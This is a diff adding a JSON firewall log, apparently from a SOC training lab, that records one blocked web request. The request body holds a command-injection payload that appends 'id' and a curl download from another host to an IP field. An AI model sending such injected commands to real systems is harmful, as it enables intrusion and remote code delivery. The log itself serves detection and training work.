@@ -1,0 +1,26 @@
+{
+  "window_start": "2026-10-28T22:56:51.803869+00:00",
+  "window_end": "2026-10-28T22:58:19.446040+00:00",
+  "seconds": 87.6421709060669,
+  "backend_POSTs": [],
+  "web_execs": [],
+  "proxy_requests": [],
+  "download_targets": [],
+  "blocked_transactions": [
+    {
+      "transaction": {
+        "time": "28/Oct/2026:22:57:00.657951 +0000",
+        "transaction_id": "auJ9vAu4EmFW7RLbUz-8ugAAAAA",
+        "remote_address": "192.168.144.1",
+        "remote_port": 59215,
+        "local_address": "192.168.144.20",
+        "local_port": 8080
+      },
+      "request_body": [
+        "ip=127.0.0.1%3B+%2Fusr%2Fbin%2Fid%3B+curl+--interface+192.168.144.20+--proxy+http%3A%2F%2F192.168.144.20%3A3128+--noproxy+%22%22+http%3A%2F%2F192.168.144.1%3A8090%2Ftraining-note.txt+-o+%2Ftmp%2Fsoc-training-note.txt&Submit=Submit"
+      ],
+      "status": 403,
+      "engine_mode": "ENABLED"
+    }
+  ]
+}
